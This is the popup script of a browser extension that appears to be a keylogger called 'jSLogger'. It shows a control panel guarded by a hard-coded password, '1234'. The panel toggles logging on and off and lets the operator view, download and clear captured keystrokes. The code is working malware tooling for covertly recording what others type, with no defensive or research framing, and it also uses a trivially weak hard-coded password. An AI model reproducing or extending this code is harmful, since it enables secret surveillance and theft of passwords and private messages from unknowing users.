window.onload = init;

function init(){
	getVal("power-status-get", modifyPowerStatus);
	document.getElementById("submit-password").addEventListener("submit", function(e){
		e.preventDefault();
		if(document.getElementById("password").value == "1234"){
			initAfterPassword();
		}
		else{
			document.getElementById("error-info-container").innerHTML = "*incorrect password*";
			setTimeout(function(){
				document.getElementById("error-info-container").innerHTML = "";
			}, 2000);
		}
		return false;
	});
}

function initAfterPassword(){
	var mainData = '<textarea id="keystrokes-container" rows="10">Loading...</textarea><hr /><a href="#" id="log-download-button">Download keystrokes log</a><br><br><a href="#" id="log-clear-button">Clear keystrokes log</a>';
	document.getElementById('results').style.opacity = "0";
	setTimeout(function(){
		document.getElementById('results').innerHTML = mainData;
		document.getElementById('results').style.opacity = "1";
	}, 500);
	
	setTimeout(function(){
		loadData();		
	}, 2000);
}

function loadData(){
	populateKeystrokes();
	document.getElementById('log-download-button').addEventListener('click', function(){
		var d = new Date();
		sendMessageToScript({type: "keystroke-request"},function(response) {
			download('jSLogger-log-'+d, response.keystrokes);
		});
	});
	document.getElementById('log-clear-button').addEventListener('click', function(){
		sendMessageToScript({type: "keystroke-flush"},function(response) {
			if(response.status == "true"){
				document.getElementById('keystrokes-container').innerHTML = "";
			}
		});
	});
}

function modifyPowerStatus(r){
	var powerStatus = document.getElementById('power-status');
	var powerSlider = document.getElementById('power-checkbox');
	
	var status = r.status;
	if(!status){
		powerStatus.innerHTML = "Off";
		setVal("power-status-set", '0');
		status = '0';
	}

	powerSlider.addEventListener('change', function(){
		if(powerSlider.checked){
			powerStatus.innerHTML = "On";
			setVal("power-status-set", '1');
			document.getElementById('results').style.display = "block";
		}
		else{
			powerStatus.innerHTML = "Off";
			setVal("power-status-set", '0');
			document.getElementById('results').style.display = "none";
		}
		status = getVal("power-status-get");
	});
	if(status == '1'){
		powerSlider.checked = true;
	}
	else{
		powerSlider.checked = false;
	}
	if(powerSlider.checked){
		powerStatus.innerHTML = "On";
		document.getElementById('results').style.display = "block";
	}
	else{
		powerStatus.innerHTML = "Off";
		document.getElementById('results').style.display = "none";
	}
	
}

function setVal(cname, cvalue) {
    sendMessageToScript({type: cname, data: cvalue});
}

function getVal(cname, callback) {
    sendMessageToScript({type: cname}, callback);
}

function populateKeystrokes(){
	sendMessageToScript({type: "keystroke-request"},function(response) {
	    document.getElementById('keystrokes-container').innerHTML = response.keystrokes;
	});
	// document.getElementById('keystrokes-container').addEventListener('keyup', function(){
	// 	var context = this;
	// 	sendMessageToScript({type: "keystroke-inject", data: context.innerHTML},function(response) {
	// 		console.log(response);
	// 	});
	// });
}


function sendMessageToScript(json, callback){
    chrome.runtime.sendMessage(json, function(response) {
      callback(response);
    });
}

function download(filename, text) {
  var element = document.createElement('a');
  element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
  element.setAttribute('download', filename);

  element.style.display = 'none';
  document.body.appendChild(element);

  element.click();

  document.body.removeChild(element);
}